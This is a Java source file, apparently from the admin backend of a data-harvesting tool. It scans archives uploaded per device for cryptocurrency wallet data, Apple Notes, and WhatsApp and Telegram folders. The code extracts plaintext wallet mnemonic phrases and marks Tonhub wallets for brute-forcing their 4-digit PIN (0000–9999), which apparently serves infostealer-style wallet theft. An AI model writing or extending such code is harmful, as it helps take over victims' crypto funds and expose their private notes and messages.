package com.admin.parse;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * 对齐 Python build_wallet_display / expand_uploads_with_core_export。
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class ArchiveScanner {

    private final WalletInspect walletInspect;
    private final NotesParse notesParse;

    public List<WalletDisplay> scanFile(String deviceId, String fileName, Path path) {
        List<WalletDisplay> out = new ArrayList<>();
        String[] matched = WalletMatcher.matchWalletOrArchive(fileName);
        if (matched == null) {
            return out;
        }
        String title = matched[0];
        String wkey = matched[1];
        if (path == null || !Files.isRegularFile(path)) {
            out.add(missingFile(title, fileName, wkey));
            return out;
        }
        try {
            if (Files.size(path) <= 0) {
                WalletDisplay empty = base(title, fileName, wkey, path, null);
                empty.setStatusLabel("上传包为空");
                empty.setMessage("压缩包内无文件，无法解析");
                out.add(empty);
                return out;
            }
        } catch (Exception e) {
            out.add(missingFile(title, fileName, wkey));
            return out;
        }
        if ("whatsapp".equals(wkey) || "telegram".equals(wkey)) {
            WalletDisplay d = base(title, fileName, wkey, path, null);
            d.setStatusLabel("待分析");
            d.setMessage("仅展示，不自动解析");
            out.add(d);
            return out;
        }
        if ("notes".equals(wkey)) {
            WalletDisplay d = base(title, fileName, wkey, path, null);
            List<ParsedNote> notes = notesParse.parseArchive(path, null);
            d.setNotes(notes);
            d.setStatusOk(!notes.isEmpty());
            d.setStatusLabel(d.isStatusOk() ? "已解析" : "未解析");
            d.setMessage(notes.isEmpty() ? "未解析到备忘录" : ("解析到 " + notes.size() + " 条备忘录"));
            out.add(d);
            return out;
        }
        out.add(inspectWallet(title, fileName, wkey, path, null));
        return out;
    }

    /** 对齐 Python inspect_wallet_zip：zip 找不到仍出卡，文案「文件缺失」。 */
    public WalletDisplay missingFile(String title, String fileName, String wkey) {
        WalletDisplay d = base(title, fileName, wkey, null, null);
        d.setStatusLabel("文件缺失");
        d.setMessage("上传记录存在，但磁盘上找不到对应压缩包");
        return d;
    }

    /**
     * V2 core_export：按 wallet_key 合并顶层目录，再走与单包相同的解析。
     */
    public List<WalletDisplay> scanCoreExport(String deviceId, String fileName, Path path) {
        List<WalletDisplay> out = new ArrayList<>();
        if (path == null || !Files.isRegularFile(path)) {
            return out;
        }
        Map<String, List<String>> groups = new LinkedHashMap<>();
        try {
            for (String root : ArchiveIO.listMembers(path)) {
                String member = ArchiveIO.normalize(root);
                String top = member.contains("/") ? member.split("/")[0] : member;
                if (top.isEmpty() || ".".equals(top) || "..".equals(top)) {
                    continue;
                }
                String wkey = classifyRoot(top);
                if (wkey == null || "skip".equals(wkey) || "generic".equals(wkey)) {
                    continue;
                }
                List<String> roots = groups.computeIfAbsent(wkey, k -> new ArrayList<>());
                if (!roots.contains(top)) {
                    roots.add(top);
                }
            }
        } catch (Exception ex) {
            log.warn("core_export list fail file={} err={}", fileName, ex.toString());
            return out;
        }
        for (Map.Entry<String, List<String>> en : groups.entrySet()) {
            String wkey = en.getKey();
            List<String> roots = en.getValue();
            String primary = primaryRoot(roots);
            String virtual = "core." + primary.replace('/', '.').replace('\\', '.') + ".tar";
            if ("notes".equals(wkey)) {
                WalletDisplay d = base("备忘录", virtual, "notes", path, roots);
                List<ParsedNote> notes = notesParse.parseArchive(path, roots);
                d.setNotes(notes);
                d.setStatusOk(notes != null && !notes.isEmpty());
                d.setMessage(d.isStatusOk() ? ("解析到 " + notes.size() + " 条备忘录") : "未解析到备忘录");
                out.add(d);
                continue;
            }
            if ("whatsapp".equals(wkey) || "telegram".equals(wkey)) {
                WalletDisplay d = base(WalletMatcher.walletTitle(wkey), virtual, wkey, path, roots);
                d.setMessage("仅展示，不自动解析");
                out.add(d);
                continue;
            }
            out.add(inspectWallet(WalletMatcher.walletTitle(wkey), virtual, wkey, path, roots));
        }
        return out;
    }

    private WalletDisplay inspectWallet(String title, String fileName, String wkey, Path path, List<String> roots) {
        WalletDisplay d = base(title, fileName, wkey, path, roots);
        boolean lockedKind = WalletInspect.maybePasswordLocked(wkey);
        if (lockedKind) {
            List<String> names = ArchiveIO.listMembers(path, roots);
            if (walletInspect.skipPlaintextScan(wkey, names, path)) {
                d.setUnlockable(true);
                d.setBrute("tonhub".equals(wkey));
                d.setStatusLabel("待解锁");
                d.setMessage("tonhub".equals(wkey)
                        ? "已找到 Tonhub mmkv：可输入 4 位 PIN 解锁，或点击爆破（0000–9999）"
                        : "待解锁或仅 Keychain");
                return d;
            }
        }
        String phrase = walletInspect.scanPlaintextMnemonic(path, roots);
        if (StringUtils.isNotBlank(phrase)) {
            d.setPhrase(phrase);
            d.setStatusOk(true);
            d.setUnlockable(false);
            d.setBrute(false);
            d.setStatusLabel("已解析");
            d.setMessage("已直接解析助记词");
        } else {
            d.setUnlockable(lockedKind);
            d.setBrute("tonhub".equals(wkey) && lockedKind);
            d.setStatusLabel(lockedKind ? "待解锁" : "未解析");
            d.setMessage(lockedKind ? "待解锁或仅 Keychain" : "未解析到助记词");
        }
        return d;
    }

    private String classifyRoot(String root) {
        String low = root.toLowerCase(Locale.ROOT);
        String probe = root + ".tar";
        if (low.startsWith("appgroup.")) {
            probe = root.substring("appgroup.".length()) + ".tar";
        }
        if (WalletMatcher.isNotesArchiveName(probe) || WalletMatcher.isNotesArchiveName(root + ".tar")
                || low.contains("mobilenotes")) {
            return "notes";
        }
        String[] matched = WalletMatcher.matchWallet(probe);
        if (matched == null) {
            matched = WalletMatcher.matchWallet(root + ".tar");
        }
        return matched == null ? null : matched[1];
    }

    private static String primaryRoot(List<String> roots) {
        return roots.stream()
                .sorted(Comparator
                        .comparing((String r) -> r.toLowerCase(Locale.ROOT).startsWith("appgroup."))
                        .thenComparingInt(String::length)
                        .thenComparing(r -> r))
                .findFirst()
                .orElse(roots.get(0));
    }

    private static WalletDisplay base(String title, String fileName, String wkey, Path path, List<String> roots) {
        WalletDisplay d = new WalletDisplay();
        d.setName(title);
        d.setSourceFile(fileName);
        d.setWalletKey(wkey);
        d.setArchivePath(path);
        if (roots != null) {
            d.setArchiveRoots(new ArrayList<>(roots));
        }
        return d;
    }
}
